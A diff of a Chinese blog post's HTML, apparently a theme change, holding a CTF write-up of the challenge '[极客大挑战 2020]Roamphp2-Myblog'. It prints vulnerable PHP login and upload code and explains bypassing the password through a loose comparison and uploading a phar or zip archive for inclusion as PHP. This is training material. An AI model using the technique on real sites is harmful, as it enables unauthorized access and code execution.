@@ -1,67 +1,418 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta name="description" content="BUU第三份">
-<meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTF记录3">
-<meta property="og:url" content="http://jlan.darkflow.top/posts/560a0a51.html">
-<meta property="og:site_name" content="Jlan&#39;s Little World">
-<meta property="og:description" content="BUU第三份">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837304.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081917768.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081932780.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131744693.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131745556.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209131804530.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png">
-<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png">
-<meta property="article:published_time" content="2022-08-24T13:01:02.000Z">
-<meta property="article:modified_time" content="2022-10-25T16:41:05.469Z">
-<meta property="article:author" content="Jlan">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209081837086.png"><title>BUUCTF记录3 | Jlan's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/posts/560a0a51.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  assistSearch: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
-  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
-  reward: false,
-  fancybox: false,
-  zoomImage: {"gapAside":"20px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: {"avoidBanner":false},
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
+<!DOCTYPE HTML>
+<html lang="zh-CN">
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Jlan's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">BUUCTF记录3</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-08-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-10-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/560a0a51.html" data-flag-title="BUUCTF记录3"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p>BUU第三份</p>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="BUUCTF记录3, Jlan&#39;s Little World">
+    <meta name="description" content="BUU第三份
+
+
+[极客大挑战 2020]Roamphp2-Myblog明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到
+123456&amp;lt;?php$secret_seed = mt_rand();mt_sran">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>BUUCTF记录3 | Jlan&#39;s Little World</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Jlan&#39;s Little World</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">BUUCTF记录3</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-08-24
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>BUU第三份</p>
 <span id="more"></span>
 
-
-        <h2 id="极客大挑战-2020-Roamphp2-Myblog"   >
-          <a href="#极客大挑战-2020-Roamphp2-Myblog" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Roamphp2-Myblog" class="headerlink" title="[极客大挑战 2020]Roamphp2-Myblog"></a>[极客大挑战 2020]Roamphp2-Myblog</h2>
-      <p>明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<h2 id="极客大挑战-2020-Roamphp2-Myblog"><a href="#极客大挑战-2020-Roamphp2-Myblog" class="headerlink" title="[极客大挑战 2020]Roamphp2-Myblog"></a>[极客大挑战 2020]Roamphp2-Myblog</h2><p>明显的文件读取，login中能看到登录密码生成逻辑，完全随机，没法直接拿到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>看登录逻辑</p>
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line">        <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable">$tmp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$extension</span> = pathinfo(<span class="variable">$tmp_file</span>)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allows</span>,<span class="literal">true</span>) <span class="keyword">and</span> in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.<span class="variable">$ext</span>;&#125;,<span class="variable">$allows</span>),<span class="literal">true</span>))&#123;</span><br><span class="line">        <span class="variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$tmp_path</span>,<span class="string">&quot;assets/img/upload/&quot;</span>.<span class="variable">$upload_name</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line">        <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="variable">$tmp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$extension</span> = pathinfo(<span class="variable">$tmp_file</span>)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allows</span>,<span class="literal">true</span>) <span class="keyword">and</span> in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;Files&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$ext</span></span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.<span class="variable">$ext</span>;&#125;,<span class="variable">$allows</span>),<span class="literal">true</span>))&#123;</span><br><span class="line">        <span class="variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        move_uploaded_file(<span class="variable">$tmp_path</span>,<span class="string">&quot;assets/img/upload/&quot;</span>.<span class="variable">$upload_name</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到密码验证中有一个弱比较，传入password为空直接绕过，然后就是文件上传，逻辑就是只能传图片，但是并没有限制文件内容，那phar或者zip吧内容打包都可以（因为触发还需要index中的include xxx.php，所以文件只能以php结尾），记得拦截包修改一下username和password参数，不然直接退出了</p>
